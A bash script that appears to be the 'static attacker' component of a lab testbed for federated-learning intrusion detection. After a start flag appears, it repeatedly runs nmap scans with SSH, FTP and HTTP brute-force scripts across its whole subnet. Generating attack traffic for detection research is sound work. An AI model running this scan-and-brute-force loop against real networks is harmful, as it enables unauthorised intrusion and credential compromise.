#!/bin/bash
# Static attacker entrypoint — deterministic, mechanical.
# Every 5 minutes it scans the whole network subnet it is attached to with
# nmap -sS -A and brute-forcing scripts (ssh/ftp/http). The Aracne pivot
# (attacker_pivot) keeps the LLM-driven part; this device does the noisy,
# repeatable brute-force part.
#
# Target subnet is derived from the container's own interface (works on any
# network, no hardcoded IPs), overridable via TARGET_SUBNET.

INTERFACE=$(ip route | awk '/default/ {for (i=1;i<=NF;i++) if ($i=="dev"){print $(i+1); exit}}')
INTERFACE=${INTERFACE:-eth0}
SUBNET=${TARGET_SUBNET:-$(ip -o -4 addr show "$INTERFACE" 2>/dev/null | awk '{print $4}')}
SUBNET=${SUBNET:-10.0.0.0/8}
NOW=$(date -u +%Y%m%d_%H%M%S)
LOG=/var/log/static_attacker/nmap_${NOW}.log
: > "$LOG"

echo "[static-attacker] interface=$INTERFACE subnet=$SUBNET log=$LOG"

# Experiment phase gating: stay quiet during the baseline period so the first
# FL training windows are truly benign. The experiment runner creates
# /tmp/start_static_attacker when the attack phase begins (same moment it
# launches Aracne). Standalone use: docker exec <c> touch /tmp/start_static_attacker
echo "[static-attacker] waiting for /tmp/start_static_attacker (attack phase start)..."
while [ ! -f /tmp/start_static_attacker ]; do
  sleep 2
done
echo "[static-attacker] attack phase started — engaging"

while true; do
  echo "===== $(date -u +%F\ %T) scanning $SUBNET =====" >> "$LOG"
  nmap -sS -A -sV \
    --top-ports 1000 \
    --script=default,ssh-brute,ftp-brute,http-brute \
    --script-args "userdb=/root/users.txt,brute.firstonly=true" \
    --exclude 127.0.0.0/8,localhost \
    "$SUBNET" >> "$LOG" 2>&1 || true
  echo "===== scan done $(date -u +%F\ %T) =====" >> "$LOG"
  sleep 300   # every 5 minutes
done
